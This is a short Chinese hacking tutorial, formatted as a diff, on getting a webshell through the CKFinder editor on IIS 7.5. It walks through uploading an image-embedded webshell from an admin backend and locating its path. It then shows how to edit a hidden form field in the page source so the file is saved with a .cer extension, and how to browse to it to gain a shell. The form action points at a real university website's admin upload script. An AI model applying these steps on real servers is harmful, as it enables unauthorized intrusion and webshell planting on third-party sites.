@@ -1,0 +1,43 @@
+ckfinder 编辑器在iis7.5下拿shell
+
+
+
+进入后台
+
+
+
+添加文章  浏览上传 keio.jpg 图片大马  右击查看属性获取路径
+
+
+
+点击文件管理 选择 news 目录 浏览尾页 找到自己上传的图片马 有上传的时间
+
+
+
+之后点击改名 
+
+
+
+会来到一个改名的页面  无论怎么改名都没法突破不是iis6.0也没发利用
+
+
+
+这时右击查看   源代码   补充完整的action 路径
+
+action="http://tiyu.nchu.edu.cn/admin/uploadfile.asp?currentFolder=../upfiles/news/
+
+
+
+找到一行代码为
+
+<INPUT type=hidden name=fileHZ value="jpg>
+
+的修改为
+
+<INPUT type=hidden name=fileHZ value="ceR">
+
+之后保存  另存为 ---1.htm   双击无论改名什么都是 以点 ceR结尾的
+
+访问 ceR的路径
+
+也就拿到了shell
